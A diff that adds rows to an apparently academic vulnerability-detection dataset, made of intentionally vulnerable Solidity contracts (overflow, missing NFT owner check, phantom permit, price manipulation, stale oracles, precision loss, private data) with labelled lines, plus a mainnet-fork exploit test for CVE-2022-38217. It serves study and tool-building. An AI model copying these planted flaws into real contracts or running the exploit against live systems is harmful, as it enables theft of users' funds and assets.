+    function removeFile(string calldata) external;
+
+    function toString(address) external returns (string memory);
+
+    function toString(bytes calldata) external returns (string memory);
+
+    function toString(bytes32) external returns (string memory);
+
+    function toString(bool) external returns (string memory);
+
+    function toString(uint256) external returns (string memory);
+
+    function toString(int256) external returns (string memory);
+
+    // Snapshot the current state of the evm.
+    // Returns the id of the snapshot that was created.
+    // To revert a snapshot use `revertTo`
+    function snapshot() external returns (uint256);
+
+    // Revert the state of the evm to a previous snapshot
+    // Takes the snapshot id to revert to.
+    // This deletes the snapshot and all snapshots taken after the given snapshot id.
+    function revertTo(uint256) external returns (bool);
+
+    // Creates a new fork with the given endpoint and block and returns the identifier of the fork
+    function createFork(string calldata, uint256) external returns (uint256);
+
+    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork
+    function createFork(string calldata) external returns (uint256);
+
+    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork
+    function createSelectFork(
+        string calldata,
+        uint256
+    ) external returns (uint256);
+
+    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork
+    function createSelectFork(string calldata) external returns (uint256);
+
+    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.
+    function selectFork(uint256) external;
+
+    /// Returns the currently active fork
+    /// Reverts if no fork is currently active
+    function activeFork() external returns (uint256);
+
+    // Updates the currently active fork to given block number
+    // This is similar to `roll` but for the currently active fork
+    function rollFork(uint256) external;
+
+    // Updates the given fork to given block number
+    function rollFork(uint256 forkId, uint256 blockNumber) external;
+
+    /// Returns the RPC url for the given alias
+    function rpcUrl(string calldata) external returns (string memory);
+
+    /// Returns all rpc urls and their aliases `[alias, url][]`
+    function rpcUrls() external returns (string[2][] memory);
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address account) external view returns (uint);
+
+    function transfer(address recipient, uint amount) external returns (bool);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint);
+
+    function approve(address spender, uint amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+}
+
+interface IFantasticWeslie {
+    function ownerOf(uint256 tokenId) external view returns (address owner);
+
+    function mint(bytes32[] memory merkleProof) external payable;
+}
+",{-1}
+21,21,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Invariant_modified.sol,1,Invariant_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.0;
+// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
+
+/*
+Name: Invariant issue
+
+Description:
+Assert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,
+if we decrease a value then it should never get bigger, only smaller.
+
+In the given code, the Invariant contract contains a receiveMoney function that accepts Ether and 
+increments the sender's balance with the amount received. This balance is stored as an uint64.
+Unsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.
+
+If the sender sends more Ether than the maximum that can be stored in an uint64, 
+an overflow occurs, and the value rolls over to 0 and starts incrementing from there. 
+As a result, the balance does not accurately reflect the amount of Ether received by the contract.
+
+Mitigation:
+To avoid this problem, it's important to ensure that the types you use for storing values 
+are appropriately sized for the values they need to store.
+
+REF:
+https://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/
+
+*/
+
+/*
+ * @vulnerable_at_lines: 37
+ */
+
+contract Invariant {
+    mapping(address => uint64) public balanceReceived;
+
+    function receiveMoney() public payable {
+        balanceReceived[msg.sender] += uint64(msg.value);
+    }
+
+    function withdrawMoney(address payable _to, uint64 _amount) public {
+        require(
+            _amount <= balanceReceived[msg.sender],
+            ""Not Enough Funds, aborting""
+        );
+
+        balanceReceived[msg.sender] -= _amount;
+        _to.transfer(_amount);
+    }
+}
+",{37}
+22,22,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\NFT-transfer_modified.sol,1,NFT-transfer_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC721/ERC721.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+
+/*
+Name: Unauthorized NFT Transfer in custom ERC721 implementation.
+
+Description:
+Custom transferFrom function in contract VulnerableERC721, 
+does not properly check if msg.sender is the current owner of the token or an approved address.
+As a result, any address can call the transferFrom function to transfer any token, 
+regardless of who the current owner is. 
+This allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.
+
+ 
+Mitigation:  
+To ensure that msg.sender is the current owner of the token or an approved address.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1679120390281412609
+https://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5
+https://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability
+https://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md
+*/
+
+/*
+ * @vulnerable_at_lines: 42, 36
+ */
+
+contract VulnerableERC721 is ERC721, Ownable {
+    constructor() ERC721(""MyNFT"", ""MNFT"") {}
+
+    //custom transferFrom function which missing NFT owner check.
+    function transferFrom(
+        address from,
+        address to,
+        uint256 tokenId
+    ) public override {
+        // direct transfer
+        _transfer(from, to, tokenId);
+    }
+
+    function safeMint(address to, uint256 tokenId) public onlyOwner {
+        _safeMint(to, tokenId);
+    }
+}
+
+contract FixedERC721 is ERC721, Ownable {
+    constructor() ERC721(""MyNFT"", ""MNFT"") {}
+
+    //Mitigation: add token owner check
+    function transferFrom(
+        address from,
+        address to,
+        uint256 tokenId
+    ) public override {
+        require(
+            _isApprovedOrOwner(_msgSender(), tokenId),
+            ""ERC721: caller is not token owner or approved""
+        );
+
+        _transfer(from, to, tokenId);
+    }
+
+    function safeMint(address to, uint256 tokenId) public onlyOwner {
+        _safeMint(to, tokenId);
+    }
+    /*
+    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
+        address owner = ERC721.ownerOf(tokenId);
+        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);
+    }
+*/
+}
+","{42, 36}"
+23,23,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\NFTMint_exposedMetadata_modified.sol,-1,NFTMint_exposedMetadata_modified.sol,1,"// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+import ""./interface.sol"";
+
+/*
+Name: NFT Mint via Exposed Metadata Vulnerability
+
+Description:
+The contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. 
+As a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool 
+and sell the NFTs for a profit in secondary market.
+
+The issue is the metadata should be visible after the minting is completed
+
+REF:
+https://twitter.com/Supremacy_CA/status/1596176732729769985
+https://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb
+*/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+ 
+contract ContractTest is DSTest {
+    IFantasticWeslie nftContract =
+        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie
+
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+    bytes32[] merkleTreeProof;
+
+    function setUp() public {
+        cheats.createSelectFork(""mainnet"", 16023847);
+    }
+
+    function testExploit() public {
+        //Since the contract is vulnerable to CVE-2022-38217
+        //it could lead to the early disclosure of metadata of all NFTs in the project
+        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market
+
+        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142
+        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json
+        //The issue is the metadata should be visible after the minting is completed
+
+        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b
+        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83
+
+        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;
+        cheats.prank(attacker);
+
+        merkleTreeProof.push(
+            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6
+        );
+        merkleTreeProof.push(
+            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd
+        );
+        merkleTreeProof.push(
+            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c
+        );
+        merkleTreeProof.push(
+            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604
+        );
+        merkleTreeProof.push(
+            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c
+        );
+        merkleTreeProof.push(
+            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808
+        );
+        merkleTreeProof.push(
+            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f
+        );
+        merkleTreeProof.push(
+            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1
+        );
+        merkleTreeProof.push(
+            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922
+        );
+        merkleTreeProof.push(
+            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e
+        );
+        merkleTreeProof.push(
+            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e
+        );
+        merkleTreeProof.push(
+            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0
+        );
+
+        nftContract.mint{value: 0.12 ether}(merkleTreeProof);
+
+        console.log(""Owner of NFT#142 : "", nftContract.ownerOf(142));
+    }
+}
+",{-1}
+24,24,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Oracle-stale_modified.sol,-1,Oracle-stale_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+
+/*
+Name: Oracle data feed is insufficiently validated
+
+Description:
+Chainlink price feed latestRoundData is used to retrieve price feed from chainlink. 
+We need to makes sure that the answer is not negative and  price is not stale.
+
+Mitigation:
+latestAnswer function is deprecated. Instead, use the latestRoundData function 
+to retrieve the price and make sure to add checks for stale data.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1674611468975878144
+https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94
+https://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price
+https://docs.chain.link/data-feeds/historical-data#getrounddata-return-values
+*/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+contract ContractTest is Test {
+    AggregatorV3Interface internal priceFeed;
+
+    function setUp() public {
+        vm.createSelectFork(""mainnet"", 17568400);
+
+        priceFeed = AggregatorV3Interface(
+            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419
+        ); // ETH/USD
+    }
+
+    function testUnSafePrice() public {
+        //Chainlink oracle data feed is not sufficiently validated and can return stale price.
+        (, int256 answer, , , ) = priceFeed.latestRoundData();
+        emit log_named_decimal_int(""price"", answer, 8);
+    }
+
+    function testSafePrice() public {
+        (
+            uint80 roundId,
+            int256 answer,
+            ,
+            uint256 updatedAt,
+            uint80 answeredInRound
+        ) = priceFeed.latestRoundData();
+        /*
+        Mitigation:
+        answeredInRound: The round ID in which the answer was computed
+        updatedAt: Timestamp of when the round was updated
+        answer: The answer for this round
+        */
+        require(answeredInRound >= roundId, ""answer is stale"");
+        require(updatedAt > 0, ""round is incomplete"");
+        require(answer > 0, ""Invalid feed answer"");
+        emit log_named_decimal_int(""price"", answer, 8);
+    }
+
+    receive() external payable {}
+}
+
+interface AggregatorV3Interface {
+    function latestRoundData()
+        external
+        view
+        returns (
+            uint80 roundId,
+            int256 answer,
+            uint256 startedAt,
+            uint256 updatedAt,
+            uint80 answeredInRound
+        );
+}
+",{-1}
+25,25,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Overflow_modified.sol,1,Overflow_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
+
+/*
+Name: Integrate Overflow   
+
+Description:
+The TimeLock has a flaw in the smart contract code that allows 
+an attacker to prematurely withdraw their deposited funds from the TimeLock contract. 
+The vulnerability arises due to an overflow in the increaseLockTime function, 
+which manipulates the lock time in a way that causes it to wrap around to 0, 
+enabling the attacker to withdraw their funds before the actual waiting period expires.
+
+This contract is designed to act as a time vault.
+User can deposit into this contract but cannot withdraw for atleast a week.
+User can also extend the wait time beyond the 1 week waiting period.
+
+/*
+1. Alice and bob both have 1 Ether balance
+2. Deploy TimeLock Contract
+3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
+4. Bob caused an overflow on his lockTime
+5, Alice can't withdraw 1 Ether, because the lock time not expired.
+6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0
+
+What happened?
+Attack caused the TimeLock.lockTime to overflow,
+and was able to withdraw before the 1 week waiting period.
+
+Impact: Solidity < 0.8 and without SafeMath 
+
+Mitigation:
+To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8
+*/
+
+/*
+ * @vulnerable_at_lines: 51
+ */
+
+contract TimeLock {
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] > 0, ""Insufficient funds"");
+        require(
+            block.timestamp > lockTime[msg.sender],
+            ""Lock time not expired""
+        );
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: amount}("""");
+        require(sent, ""Failed to send Ether"");
+    }
+}
+
+",{51}
+26,26,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Overflow2_modified.sol,1,Overflow2_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
+
+/*
+Name: Token Whale Overflow Vulnerability
+
+Description:
+This contract demonstrates an integer underflow vulnerability in an ERC20 token contract. 
+The vulnerability exists in the implementation of the transferFrom function. Due to the lack 
+of automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit 
+this vulnerability to generate a large amount of tokens.
+
+How it works:
+1. Contract initializes with deployer receiving 1000 tokens
+2. Deployer transfers 800 tokens to Alice
+3. Alice approves the attacker to spend 1000 tokens
+4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob
+5. Due to the lack of overflow checking in the _transfer function's subtraction operation, 
+   an underflow occurs when Alice's balance is insufficient
+6. The underflow causes Alice's balance to become an extremely large number, 
+   effectively creating tokens out of thin air
+
+Impact: 
+- Affects contracts using Solidity < 0.8.0
+- Contracts not using SafeMath library
+
+Mitigation:
+1. Use Solidity 0.8.0 or later which has built-in overflow checking
+2. Use SafeMath library for older versions
+3. Properly validate balances before transfers
+
+This vulnerability demonstrates why proper integer overflow/underflow protection is crucial 
+in smart contract development, particularly in token contracts where numerical operations 
+are frequent and critical to the contract's security.
+*/
+
+/*
+ * @vulnerable_at_lines: 66
+ */
+
+contract TokenWhaleChallenge {
+    address player;
+
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = ""Simple ERC20 Token"";
+    string public symbol = ""SET"";
+    uint8 public decimals = 18;
+
+    function TokenWhaleDeploy(address _player) public {
+        player = _player;
+        totalSupply = 1000;
+        balanceOf[player] = 1000;
+    }
+
+    function isComplete() public view returns (bool) {
+        return balanceOf[player] >= 1000000;
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+
+        emit Transfer(msg.sender, to, value);
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+
+    function approve(address spender, uint256 value) public {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public {
+        require(balanceOf[from] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+        require(allowance[from][msg.sender] >= value);
+
+        allowance[from][msg.sender] -= value;
+        _transfer(to, value);
+    }
+}
+",{66}
+27,27,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\payable-transfer_modified.sol,1,payable-transfer_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Incorrect use of payable.transfer()
+
+Description:
+After the implementation of EIP 1884 in the Istanbul hard fork, 
+the gas cost of the SLOAD operation was increased, 
+resulting in the breaking of some existing smart contracts.
+
+When transferring ETH to recipients, if Solidity's transfer() or send() method 
+is used, certain shortcomings arise, particularly when the recipient 
+is a smart contract. These shortcomings can make it impossible to 
+successfully transfer ETH to the smart contract recipient.
+
+Specifically, the transfer will inevitably fail when the smart contract:
+    1.does not implement a payable fallback function, or
+    2.implements a payable fallback function which would incur more than 2300 gas units, or
+    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.
+
+Mitigation:  
+Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1678958093273829376
+https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/
+https://github.com/code-423n4/2022-12-escher-findings/issues/99
+*/
+
+/*
+ * @vulnerable_at_lines: 50
+ */
+
+contract SimpleBank {
+    mapping(address => uint) private balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        // the issue is here
+        payable(msg.sender).transfer(amount);
+    }
+}
+
+contract FixedSimpleBank {
+    mapping(address => uint) private balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        (bool success, ) = payable(msg.sender).call{value: amount}("""");
+        require(success, "" Transfer of ETH Failed"");
+    }
+}
+",{50}
+28,28,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\phantom-permit_modified.sol,1,phantom-permit_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
+
+/*
+Name: Phantom function - Permit Function 
+
+Description:
+Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.
+key:
+1.Token that does not support EIP-2612 permit. 
+2.Token has a fallback function.
+For example: WETH.
+
+Mitigation:  
+Use SafeERC20's safePermit - Revert on invalid signature.
+https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1671347058568237057
+https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f
+*/
+
+/*
+ * @vulnerable_at_lines: 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60
+ */
+
+contract VulnPermit {
+    IERC20 public token;
+
+    constructor(IERC20 _token) {
+        token = _token;
+    }
+
+    function deposit(uint256 amount) public {
+        require(
+            token.transferFrom(msg.sender, address(this), amount),
+            ""Transfer failed""
+        );
+    }
+
+    function depositWithPermit(
+        address target,
+        uint256 amount,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) public {
+        (bool success, ) = address(token).call(
+            abi.encodeWithSignature(
+                ""permit(address,uint256,uint8,bytes32,bytes32)"",
+                target,
+                amount,
+                v,
+                r,
+                s
+            )
+        );
+        require(success, ""Permit failed"");
+
+        require(
+            token.transferFrom(target, address(this), amount),
+            ""Transfer failed""
+        );
+    }
+
+    function withdraw(uint256 amount) public {
+        require(token.transfer(msg.sender, amount), ""Transfer failed"");
+    }
+}
+
+contract WETH9 {
+    string public name = ""Wrapped Ether"";
+    string public symbol = ""WETH"";
+    uint8 public decimals = 18;
+
+    event Approval(address indexed src, address indexed guy, uint wad);
+    event Transfer(address indexed src, address indexed dst, uint wad);
+    event Deposit(address indexed dst, uint wad);
+    event Withdrawal(address indexed src, uint wad);
+
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+
+    fallback() external payable {
+        deposit();
+    }
+
+    receive() external payable {}
+
+    function deposit() public payable {
+        balanceOf[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw(uint wad) public {
+        require(balanceOf[msg.sender] >= wad);
+        balanceOf[msg.sender] -= wad;
+        payable(msg.sender).transfer(wad);
+        emit Withdrawal(msg.sender, wad);
+    }
+
+    function totalSupply() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function approve(address guy, uint wad) public returns (bool) {
+        allowance[msg.sender][guy] = wad;
+        emit Approval(msg.sender, guy, wad);
+        return true;
+    }
+
+    function transfer(address dst, uint wad) public returns (bool) {
+        return transferFrom(msg.sender, dst, wad);
+    }
+
+    function transferFrom(
+        address src,
+        address dst,
+        uint wad
+    ) public returns (bool) {
+        require(balanceOf[src] >= wad);
+
+        if (
+            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
+        ) {
+            require(allowance[src][msg.sender] >= wad);
+            allowance[src][msg.sender] -= wad;
+        }
+
+        balanceOf[src] -= wad;
+        balanceOf[dst] += wad;
+
+        emit Transfer(src, dst, wad);
+
+        return true;
+    }
+}
+","{50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60}"
+29,29,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Precision-loss_modified.sol,1,Precision-loss_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Precision Loss - rounding down to zero
+
+Description:
+Support all the ERC20 tokens, as those tokens may have different decimal places. 
+For example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.
+
+Mitigation:  
+Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.
+Rounding down related issues can be avoided in many ways:
+    1.Using libraries for rounding up/down as expected
+    2.Requiring result is not zero or denominator is <= numerator
+    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified
+
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1675805135061286914
+https://github.com/sherlock-audit/2023-02-surge-judging/issues/244
+https://github.com/sherlock-audit/2023-02-surge-judging/issues/122
+https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero
+*/
+
+/*
+ * @vulnerable_at_lines: 52
+ */
+
+contract SimplePool {
+    uint public totalDebt;
+    uint public lastAccrueInterestTime;
+    uint public loanTokenBalance;
+
+    constructor() {
+        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.
+        lastAccrueInterestTime = block.timestamp - 1;
+        loanTokenBalance = 500e18;
+    }
+
+    function getCurrentReward() public view returns (uint _reward) {
+        // Get the time passed since the last interest accrual
+        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1
+
+        // If the time passed is 0, return 0 reward
+        if (_timeDelta == 0) return 0;
+
+        // Calculate the supplied value
+        // uint _supplied = totalDebt + loanTokenBalance;
+        //console.log(_supplied);
+        // Calculate the reward
+        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);
+
+        // 31536000 is the number of seconds in a year
+        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000
+        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000
+        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0
+        _reward;
+    }
+}
+",{52}
+30,30,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Price_manipulation_modified.sol,1,Price_manipulation_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+
+/*
+Name: Price manipulation
+
+Description:
+Incorrect price calculation over balanceOf, getReverse may refer to a situation 
+where the price of a token or asset is not accurately calculated based on the balanceOf function.
+
+Mitigation:  
+Use a manipulation resistant oracle, chainlink, TWAP, etc.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1673948842738487296
+https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price
+https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation
+https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation
+*/
+
+/*
+ * @vulnerable_at_lines: 68
+ */
+
+contract USDa is ERC20, Ownable {
+    constructor() ERC20(""USDA"", ""USDA"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+contract USDb is ERC20, Ownable {
+    constructor() ERC20(""USDB"", ""USDB"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+contract SimplePool {
+    IERC20 public USDaToken;
+    IERC20 public USDbToken;
+
+    constructor(address _USDa, address _USDb) {
+        USDaToken = IERC20(_USDa);
+        USDbToken = IERC20(_USDb);
+    }
+
+    function getPrice() public view returns (uint256) {
+        //Incorrect price calculation over balanceOf
+        uint256 USDaAmount = USDaToken.balanceOf(address(this));
+        uint256 USDbAmount = USDbToken.balanceOf(address(this));
+
+        // Ensure USDbAmount is not zero to prevent division by zero
+        if (USDaAmount == 0) {
+            return 0;
+        }
+
+        // Calculate the price as the ratio of USDa to USDb
+        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
+        return USDaPrice;
+    }
+
+    function flashLoan(
+        uint256 amount,
+        address borrower,
+        bytes calldata data
+    ) public {
+        uint256 balanceBefore = USDaToken.balanceOf(address(this));
+        require(balanceBefore >= amount, ""Not enough liquidity"");
+        require(
+            USDaToken.transfer(borrower, amount),
+            ""Flashloan transfer failed""
+        );
+        (bool success, ) = borrower.call(data);
+        require(success, ""Flashloan callback failed"");
+        uint256 balanceAfter = USDaToken.balanceOf(address(this));
+        require(balanceAfter >= balanceBefore, ""Flashloan not repaid"");
+    }
+}
+
+contract SimpleBank {
+    IERC20 public token; //USDA
+    SimplePool public pool;
+    IERC20 public payoutToken; //USDb
+
+    constructor(address _token, address _pool, address _payoutToken) {
+        token = IERC20(_token);
+        pool = SimplePool(_pool);
+        payoutToken = IERC20(_payoutToken);
+    }
+
+    function exchange(uint256 amount) public {
+        require(
+            token.transferFrom(msg.sender, address(this), amount),
+            ""Transfer failed""
+        );
+        uint256 price = pool.getPrice();
+        require(price > 0, ""Price cannot be zero"");
+        uint256 tokensToReceive = (amount * price) / (10 ** 18);
+        require(
+            payoutToken.transfer(msg.sender, tokensToReceive),
+            ""Payout transfer failed""
+        );
+    }
+}
+",{68}
+31,31,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Privatedata_modified.sol,1,Privatedata_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Private Data Exposure
+
+Description:
+Solidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.
+
+If the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.
+Mitigation:
+Avoid storing sensitive data on-chain
+
+REF
+https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d
+
+*/
+
+/*
+ * @vulnerable_at_lines: 25, 28
+ */
+
+contract Vault {
+    // slot 0
+    uint256 private password;
+
+    constructor(uint256 _password) {
+        password = _password;
+        User memory user = User({id: 0, password: bytes32(_password)});
+        users.push(user);
+        idToUser[0] = user;
+    }
+
+    struct User {
+        uint id;
+        bytes32 password;
+    }
+
+    // slot 1
+    User[] public users;
+    // slot 2
+    mapping(uint => User) public idToUser;
+
+    function getArrayLocation(
+        uint slot,
+        uint index,
+        uint elementSize
+    ) public pure returns (bytes32) {
